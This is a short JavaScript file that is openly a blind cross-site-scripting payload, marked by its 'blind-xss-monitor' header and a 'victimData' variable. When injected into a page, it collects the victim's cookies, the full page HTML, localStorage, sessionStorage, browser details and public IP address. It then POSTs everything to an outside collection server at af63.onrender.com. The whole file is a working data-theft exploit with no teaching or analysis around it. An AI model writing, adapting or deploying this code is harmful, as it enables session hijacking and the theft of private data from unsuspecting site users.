(function() {
    'use strict';
    
    const collectData = async () => {
        const data = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            cookies: document.cookie,
            referrer: document.referrer,
            title: document.title,
            language: navigator.language,
            platform: navigator.platform,
            
            domHtml: document.documentElement.outerHTML,
            
            localStorage: JSON.stringify({...localStorage}),
            
            sessionStorage: JSON.stringify({...sessionStorage}),
            
            screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
            
            publicIp: 'Getting...'
        };
        
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            data.publicIp = ipData.ip;
        } catch (err) {
            data.publicIp = `Failed: ${err.message}`;
        }
        
        return data;
    };
    
    const sendToBackend = async (data) => {
        const BACKEND_URL = 'https://af63.onrender.com/log';
        
        try {
            const response = await fetch(BACKEND_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Payload-Source': 'blind-xss-monitor'
                },
                body: JSON.stringify(data),
                mode: 'cors',
                credentials: 'omit'
            });
            
            console.log('Payload: Sending Data, status:', response.status);
        } catch (error) {
            console.error('Payload: Failed to sending data:', error);
        }
    };
    
    // 4. Jalankan proses
    (async () => {
        try {
            const victimData = await collectData();
            await sendToBackend(victimData);
        } catch (error) {
            console.error('Payload: Error Execution:', error);
        }
    })();
    
})();
